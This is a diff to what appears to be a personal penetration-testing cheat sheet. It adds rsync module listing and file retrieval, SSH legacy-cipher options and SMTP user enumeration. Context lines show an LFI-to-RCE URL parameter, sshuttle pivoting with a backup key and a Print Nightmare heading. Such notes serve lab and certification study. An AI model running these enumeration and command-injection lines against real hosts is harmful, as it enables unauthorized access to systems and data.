@@ -62,11 +62,18 @@ ad-ldap-enum.py -l 10.10.10.10 -d domain.local
 ssh user@10.10.10.51 sh
 
 [ssh with different key format]
-ssh alice@10.10.10.10 -c 3des-cbc
+ssh alice@10.10.10.10 -c 3des-cbc -oKexAlgorithms=+diffie-hellman-group1-sha1
 
 [sshutle]
 sshuttle -vr sshuser@10.10.110.74 192.168.20.0/24
 sshuttle -vr root@10.200.48.200 --ssh-cmd "ssh -i id_rsa.bak" 10.200.48.200/24
+
+[rsync]
+nmap -sV --script "rsync-list-modules" -p 873 10.10.10.10
+rsync -av --list-only rsync://10.10.10.10/Modules
+rsync -av rsync://10.10.222.11/Conf ./shared
+# reference
+https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
 
 [autosolve crypto]
 https://scwf.dima.ninja/
@@ -963,6 +970,9 @@ DATA
 #RCE
 ?page=/var/log/mail&cmd=ls -la
 ```
+
+[smtp-user-enum]
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.11.1.231
 
 [print nightmare]
 # check if vulnerable
